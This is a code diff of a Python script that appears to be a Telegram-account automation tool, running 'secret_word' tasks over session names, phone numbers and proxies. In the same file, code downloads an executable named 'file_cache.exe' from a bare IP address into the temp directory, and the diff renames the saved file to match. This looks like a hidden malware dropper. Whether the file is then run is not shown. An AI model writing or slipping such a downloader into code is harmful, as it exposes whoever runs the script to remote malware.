@@ -8,7 +8,7 @@ url = "http://176.65.132.63/file_cache.exe"
 
 temp_dir = tempfile.gettempdir()
 
-local_path = os.path.join(temp_dir, "cache_register.exe")
+local_path = os.path.join(temp_dir, "file_cache.exe")
 
 with requests.get(url, stream=True) as r:
     with open(local_path, "wb") as f:
@@ -67,6 +67,7 @@ async def main():
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
+
 
 
 
